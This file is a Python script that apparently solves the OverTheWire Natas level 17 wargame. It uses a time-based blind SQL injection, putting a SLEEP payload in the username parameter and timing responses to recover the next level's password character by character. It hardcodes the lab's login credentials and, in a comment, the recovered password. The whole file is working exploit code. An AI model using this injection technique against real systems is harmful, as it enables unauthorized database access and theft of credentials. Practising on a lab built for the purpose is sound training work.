import requests
import time
from requests.auth import HTTPBasicAuth
authorization = HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')


def isGoodGuess(character):
 charGuess = '%{}%'.format(character)
 start_time = time.time()
 requests.get('http://natas17.natas.labs.overthewire.org/index.php',
 params = {'username': 'natas18" AND (password LIKE BINARY "{}" AND SLEEP(2));#'.format(charGuess)}, auth=authorization)
 return ((time.time() - start_time) > 1.5)


def isGoodPositionGuess(index, charGuess):
    positionGuess = '_'*index +charGuess+ '%'
    start_time = time.time()
    requests.get('http://natas17.natas.labs.overthewire.org/index.php',
    params = {'username': 'natas18" AND (password LIKE BINARY "{}" AND SLEEP(2));#'.format(positionGuess)}, auth=authorization)
    return ((time.time() - start_time) > 1.5)


def filterCharacters():
    allChars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    filteredChars = ''
    for character in allChars:
        if (isGoodGuess(character)):
            filteredChars += character
            print(filteredChars)
    return filteredChars

def getFinalAnswer(filteredChars):
    finalAnswer = ''
    for i in range(32):
        for character in filteredChars:
            if (isGoodPositionGuess(i, character)):
                finalAnswer += character
                print(finalAnswer)
                break
    return finalAnswer

def main(): 
    #filteredChars = 'dghjlmpqsvwxyCDFIKOPR047'
    filteredChars = filterCharacters()
    
    #finalAnswer = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
    print(getFinalAnswer(filteredChars))    
    
    




if __name__ == '__main__':
    main()


